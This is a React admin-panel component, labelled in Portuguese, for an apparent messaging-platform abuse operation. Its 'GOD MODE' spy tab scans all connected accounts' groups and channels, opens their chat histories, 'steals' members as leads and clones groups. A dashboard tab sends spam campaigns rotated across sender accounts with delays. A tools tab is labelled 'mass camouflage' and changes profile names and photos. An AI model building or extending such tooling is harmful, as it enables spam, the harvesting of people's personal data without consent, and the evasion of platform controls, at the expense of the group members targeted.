import { useState, useEffect } from 'react';

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  
  // Tabs: 'dashboard', 'spy', 'tools'
  const [tab, setTab] = useState('spy'); 
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  const [processing, setProcessing] = useState(false);

  // Estados do Disparo
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  const [selectedPhones, setSelectedPhones] = useState(new Set());

  // --- GOD MODE (Espião Global) ---
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [filterNumber, setFilterNumber] = useState(''); // Filtro por número

  // Estados de Chat e Visualização
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);

  // Estados Ferramentas
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- INICIALIZAÇÃO ---
  useEffect(() => {
    // Tenta recuperar dados salvos no navegador para não precisar escanear sempre
    const savedGroups = localStorage.getItem('godModeGroups');
    const savedChannels = localStorage.getItem('godModeChannels');
    if (savedGroups) setAllGroups(JSON.parse(savedGroups));
    if (savedChannels) setAllChannels(JSON.parse(savedChannels));
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/admin-login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ password: passwordInput })
      });
      const data = await res.json();
      if(data.success) { 
          setIsAuthenticated(true); 
          fetchData(); 
      } else {
          alert('Senha incorreta');
      }
    } catch (e) { alert('Erro de conexão'); }
  };

  const fetchData = async () => {
    try {
      const sRes = await fetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(sData.sessions || []);
      
      const stRes = await fetch('/api/stats');
      if (stRes.ok) setStats(await stRes.json());
    } catch (e) { console.error(e); }
  };

  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);

  // --- FUNÇÕES DE AÇÃO (Dashboard) ---
  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas!');
     setProcessing(true);
     addLog('Iniciando disparo...');
     try {
         const res = await fetch('/api/get-campaign-leads'); 
         const data = await res.json();
         const leads = data.leads || [];
         if (leads.length === 0) { setProcessing(false); return alert('Sem leads pendentes!'); }
         
         const phones = Array.from(selectedPhones);
         for (let i = 0; i < leads.length; i++) {
             const sender = phones[i % phones.length];
             addLog(`Enviando: ${sender} > ${leads[i].user_id}`);
             await fetch('/api/dispatch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ senderPhone: sender, target: leads[i].user_id, message: msg, leadDbId: leads[i].id })
             });
             await new Promise(r => setTimeout(r, 2000)); // Delay de segurança
         }
         addLog('✅ Campanha finalizada.'); fetchData();
     } catch (e) { addLog(`Erro: ${e.message}`); }
     setProcessing(false);
  };

  const handleDelete = async (phone) => {
      if(!confirm(`Remover ${phone}?`)) return;
      await fetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}), headers: {'Content-Type': 'application/json'} });
      setSessions(prev => prev.filter(s => s.phone_number !== phone));
  };

  // --- GOD MODE: ESCANEAR REDE ---
  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Nenhuma conta conectada para escanear.");
      setIsScanning(true);
      setScanProgress(0);

      let groups = [];
      let channels = [];

      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          // Atualiza progresso visual
          setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
          
          try {
              const res = await fetch('/api/spy/list-chats', { 
                  method: 'POST', 
                  body: JSON.stringify({ phone }), 
                  headers: {'Content-Type': 'application/json'} 
              });
              const data = await res.json();
              
              if (data.chats) {
                  data.chats.forEach(c => {
                      const chatObj = { ...c, ownerPhone: phone };
                      if (c.type === 'Canal') channels.push(chatObj);
                      else groups.push(chatObj);
                  });
              }
          } catch (e) { console.error(`Erro ao ler ${phone}`); }
      }

      // Remove duplicatas (mesmo grupo em várias contas)
      const uniqueGroups = [...new Map(groups.map(item => [item.id, item])).values()];
      const uniqueChannels = [...new Map(channels.map(item => [item.id, item])).values()];

      // Ordena por tamanho (maiores primeiro)
      uniqueGroups.sort((a,b) => b.participantsCount - a.participantsCount);
      uniqueChannels.sort((a,b) => b.participantsCount - a.participantsCount);

      setAllGroups(uniqueGroups);
      setAllChannels(uniqueChannels);
      
      // SALVA NO NAVEGADOR (PERSISTÊNCIA SIMPLES)
      localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
      localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));

      setIsScanning(false);
      alert(`Varredura completa! ${uniqueGroups.length} Grupos e ${uniqueChannels.length} Canais encontrados.`);
  };

  // --- AÇÕES DO ESPIÃO ---
  const openChat = async (chat) => {
      setViewingChat(chat);
      setLoadingHistory(true);
      setChatHistory([]);
      try {
        const res = await fetch('/api/spy/get-history', { 
            method: 'POST', 
            body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }), 
            headers: {'Content-Type': 'application/json'} 
        });
        const data = await res.json();
        setChatHistory(data.history || []);
      } catch (e) { alert('Erro ao carregar mensagens'); }
      setLoadingHistory(false);
  };

  const stealLeads = async (chat) => {
      const action = chat.type === 'Canal' ? 'Tentar extrair comentários' : 'Roubar leads';
      if(!confirm(`${action} de "${chat.title}" usando a conta ${chat.ownerPhone}?`)) return;
      
      addLog(`🕷️ Iniciando extração em ${chat.title}...`);
      
      const res = await fetch('/api/spy/harvest', { 
          method: 'POST', 
          body: JSON.stringify({ 
              phone: chat.ownerPhone, 
              chatId: chat.id, 
              chatName: chat.title, 
              isChannel: chat.type === 'Canal' 
          }), 
          headers: {'Content-Type': 'application/json'} 
      });
      const data = await res.json();
      
      if(data.success) {
          addLog(`✅ ${data.message}`);
          fetchData(); // Atualiza contador de leads
      } else {
          addLog(`❌ Erro: ${data.error}`);
          alert(`Erro: ${data.error}`);
      }
  };

  const cloneGroup = async (chat) => {
      if(!confirm(`Clonar estrutura de "${chat.title}"?`)) return;
      const res = await fetch('/api/spy/clone-group', {
          method: 'POST',
          body: JSON.stringify({ phone: chat.ownerPhone, originalChatId: chat.id, originalTitle: chat.title }),
          headers: {'Content-Type': 'application/json'}
      });
      if(res.ok) addLog(`✅ Clonagem de ${chat.title} iniciada.`);
      else addLog('❌ Erro na clonagem.');
  };

  // --- FILTRO ---
  const filteredGroups = filterNumber 
    ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) 
    : allGroups;
    
  const filteredChannels = filterNumber 
    ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) 
    : allChannels;

  // Renderização
  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
          <form onSubmit={handleLogin}><input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha Admin" style={{padding:'10px', borderRadius:'5px'}}/></form>
      </div>
  );

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
        
        {/* MODAL DE CHAT */}
        {viewingChat && (
            <div style={{position:'fixed', top:0, left:0, width:'100%', height:'100%', background:'rgba(0,0,0,0.9)', zIndex:999, display:'flex', alignItems:'center', justifyContent:'center'}}>
                <div style={{width:'600px', height:'80%', background:'#161b22', border:'1px solid #30363d', borderRadius:'10px', display:'flex', flexDirection:'column'}}>
                    <div style={{padding:'15px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between', background:'#21262d'}}>
                        <div>
                            <h3 style={{margin:0, color:'white'}}>{viewingChat.title}</h3>
                            <small>Via: {viewingChat.ownerPhone}</small>
                        </div>
                        <button onClick={()=>setViewingChat(null)} style={{background:'none', border:'none', color:'red', fontSize:'20px', cursor:'pointer'}}>✖</button>
                    </div>
                    <div style={{flex:1, overflowY:'auto', padding:'15px', display:'flex', flexDirection:'column', gap:'10px'}}>
                        {loadingHistory ? <p style={{textAlign:'center'}}>Carregando...</p> : 
                            chatHistory.length === 0 ? <p style={{textAlign:'center'}}>Histórico vazio.</p> :
                            chatHistory.map((m, i) => (
                                <div key={i} style={{alignSelf: m.isOut ? 'flex-end' : 'flex-start', background: m.isOut ? '#238636' : '#30363d', padding:'10px', borderRadius:'8px', maxWidth:'80%'}}>
                                    <div style={{fontSize:'10px', opacity:0.7, marginBottom:'2px'}}>{m.sender} • {new Date(m.date * 1000).toLocaleTimeString()}</div>
                                    <div style={{color:'white'}}>{m.text}</div>
                                    {m.hasMedia && <div style={{fontSize:'10px', color:'#58a6ff', marginTop:'5px'}}>📷 Mídia Anexada</div>}
                                </div>
                            ))
                        }
                    </div>
                </div>
            </div>
        )}

        {/* MENU SUPERIOR */}
        <div style={{marginBottom:'20px', borderBottom:'1px solid #30363d', paddingBottom:'10px'}}>
            <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', border:'1px solid #8957e5', color:'white', borderRadius:'5px', cursor:'pointer'}}>👁️ GOD MODE</button>
            <button onClick={()=>setTab('dashboard')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', border:'1px solid #238636', color:'white', borderRadius:'5px', cursor:'pointer'}}>🚀 DASHBOARD</button>
            <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', border:'1px solid #1f6feb', color:'white', borderRadius:'5px', cursor:'pointer'}}>🛠️ TOOLS</button>
        </div>

        {/* CONTEÚDO */}
        {tab === 'spy' && (
            <div>
                <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px', background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                    <div>
                        <h2 style={{margin:0, color:'white'}}>Radar Global ({sessions.length} contas)</h2>
                        <div style={{fontSize:'12px', color:'#8b949e'}}>
                            Total Mapeado: {allGroups.length} Grupos | {allChannels.length} Canais
                        </div>
                    </div>
                    <div style={{display:'flex', gap:'10px'}}>
                        <input 
                            type="text" 
                            placeholder="Filtrar por número..." 
                            value={filterNumber} 
                            onChange={e => setFilterNumber(e.target.value)}
                            style={{padding:'10px', borderRadius:'5px', background:'#0d1117', border:'1px solid #30363d', color:'white'}}
                        />
                        <button onClick={scanNetwork} disabled={isScanning} style={{padding:'10px 20px', background:'#8957e5', color:'white', border:'none', borderRadius:'5px', cursor:'pointer', fontWeight:'bold'}}>
                            {isScanning ? `LENDO ${scanProgress}%` : '🔄 ESCANEAR TUDO'}
                        </button>
                    </div>
                </div>

                <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
                    
                    {/* COLUNA GRUPOS */}
                    <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                        <h3 style={{color:'#d29922', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>👥 GRUPOS ({filteredGroups.length})</h3>
                        <div style={{maxHeight:'70vh', overflowY:'auto'}}>
                            {filteredGroups.map(g => (
                                <div key={g.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d'}}>
                                    <div style={{width:'40px', height:'40px', borderRadius:'50%', background:'#30363d', overflow:'hidden'}}>
                                        {g.photo ? <img src={g.photo} style={{width:'100%', height:'100%'}}/> : <div style={{textAlign:'center', lineHeight:'40px'}}>👥</div>}
                                    </div>
                                    <div style={{flex:1}}>
                                        <div style={{fontWeight:'bold', color:'white', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', maxWidth:'200px'}}>{g.title}</div>
                                        <div style={{fontSize:'11px', color:'#8b949e'}}>{g.participantsCount} leads • {g.ownerPhone}</div>
                                    </div>
                                    <button onClick={()=>openChat(g)} style={{background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'4px', cursor:'pointer'}}>👁️</button>
                                    <button onClick={()=>stealLeads(g)} style={{background:'#d29922', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'12px', padding:'5px 10px'}}>🕷️ ROUBAR</button>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* COLUNA CANAIS */}
                    <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                        <h3 style={{color:'#3390ec', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>📢 CANAIS ({filteredChannels.length})</h3>
                        <div style={{maxHeight:'70vh', overflowY:'auto'}}>
                            {filteredChannels.map(c => (
                                <div key={c.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d'}}>
                                    <div style={{width:'40px', height:'40px', borderRadius:'50%', background:'#30363d', overflow:'hidden'}}>
                                        {c.photo ? <img src={c.photo} style={{width:'100%', height:'100%'}}/> : <div style={{textAlign:'center', lineHeight:'40px'}}>📢</div>}
                                    </div>
                                    <div style={{flex:1}}>
                                        <div style={{fontWeight:'bold', color:'white', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', maxWidth:'200px'}}>{c.title}</div>
                                        <div style={{fontSize:'11px', color:'#8b949e'}}>{c.participantsCount} inscritos • {c.ownerPhone}</div>
                                    </div>
                                    <button onClick={()=>openChat(c)} style={{background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'4px', cursor:'pointer'}}>👁️</button>
                                    <button onClick={()=>stealLeads(c)} style={{background:'#1f6feb', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'10px', padding:'5px 10px'}}>🕷️ TENTAR</button>
                                    <button onClick={()=>cloneGroup(c)} style={{background:'#238636', border:'none', color:'white', borderRadius:'4px', cursor:'pointer'}}>🐑</button>
                                </div>
                            ))}
                        </div>
                    </div>

                </div>
            </div>
        )}

        {/* OUTRAS TABS (Mantidas iguais para não quebrar) */}
        {tab === 'dashboard' && (
            <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                <div style={{display:'flex', gap:'20px', marginBottom:'20px'}}>
                    <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #30363d'}}><h3>{stats.total}</h3><small>Leads</small></div>
                    <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #d29922'}}><h3>{stats.pending}</h3><small>Pendentes</small></div>
                    <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #238636'}}><h3>{stats.sent}</h3><small>Enviados</small></div>
                </div>
                <h3>Disparo Rápido</h3>
                <textarea value={msg} onChange={e=>setMsg(e.target.value)} style={{width:'100%', height:'80px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'10px'}}/>
                <button onClick={startRealCampaign} disabled={processing} style={{marginTop:'10px', padding:'15px', width:'100%', background:'#238636', color:'white', border:'none', fontWeight:'bold', cursor:'pointer'}}>{processing ? 'ENVIANDO...' : 'INICIAR DISPARO'}</button>
                <div style={{marginTop:'20px', height:'100px', overflowY:'auto', background:'#000', padding:'10px', fontSize:'12px'}}>
                    {logs.map((l,i)=><div key={i}>{l}</div>)}
                </div>
                <div style={{marginTop:'20px'}}>
                    <h3>Contas Ativas</h3>
                    {sessions.map(s => (
                        <div key={s.id} style={{padding:'10px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between'}}>
                            <span>{s.phone_number}</span>
                            <div>
                                <button onClick={()=>toggleSelect(s.phone_number)} style={{marginRight:'5px'}}>{selectedPhones.has(s.phone_number)?'✓':'+'}</button>
                                <button onClick={()=>handleDelete(s.phone_number)} style={{background:'#ff5c5c', border:'none'}}>🗑️</button>
                            </div>
                        </div>
                    ))}
                </div>
            </div>
        )}

        {tab === 'tools' && (
             <div style={{ backgroundColor: '#161b22', padding: '20px' }}>
                <h3>🎭 Camuflagem em Massa</h3>
                <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                <button style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR PERFIS (Implementado na API)</button>
            </div>
        )}
    </div>
  );
}
